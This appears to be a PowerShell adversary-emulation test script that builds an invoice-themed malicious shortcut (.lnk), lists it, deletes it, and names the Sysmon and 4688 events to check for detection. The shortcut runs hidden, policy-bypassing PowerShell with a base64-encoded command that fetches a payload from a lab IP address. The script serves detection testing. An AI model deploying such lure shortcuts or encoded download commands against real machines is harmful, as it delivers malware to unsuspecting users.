# CADRE — WT063 — Malicious LNK File
. ..\windows\lib\cadre-env.ps1
. ..\windows\lib\common.ps1
print_banner "WT063 - Malicious LNK File"
start_attack "063" "Malicious LNK"
step "Build malicious LNK"
$wshell = New-Object -ComObject WScript.Shell
$lnk = $wshell.CreateShortcut("C:\Windows\Temp\Invoice.lnk")
$lnk.TargetPath = "powershell.exe"
$lnk.Arguments = "-WindowStyle Hidden -Exec Bypass -enc JABkAD0AKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4ARABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvADEAOQAyAC4AMQA2ADgALgA3ADcALgA2ADAAOgA4ADAAOAAxAC8AcABhAHkAbABvAGEAZAAuAGUAeABlACcAKQA="
$lnk.IconLocation = "$env:SystemRoot\System32\shell32.dll,1"
$lnk.Description = "Invoice Q2-2026"
$lnk.WindowStyle = 7
$lnk.Save()
step "LNK Created"
run_cmd "Get-ChildItem C:\Windows\Temp\Invoice.lnk | Select-Object Name, Length"
step "Clean up"
run_cmd "Remove-Item C:\Windows\Temp\Invoice.lnk -Force"
result 0 "WT063 — check Sysmon EID 1 (explorer -> powershell.exe), 4688"
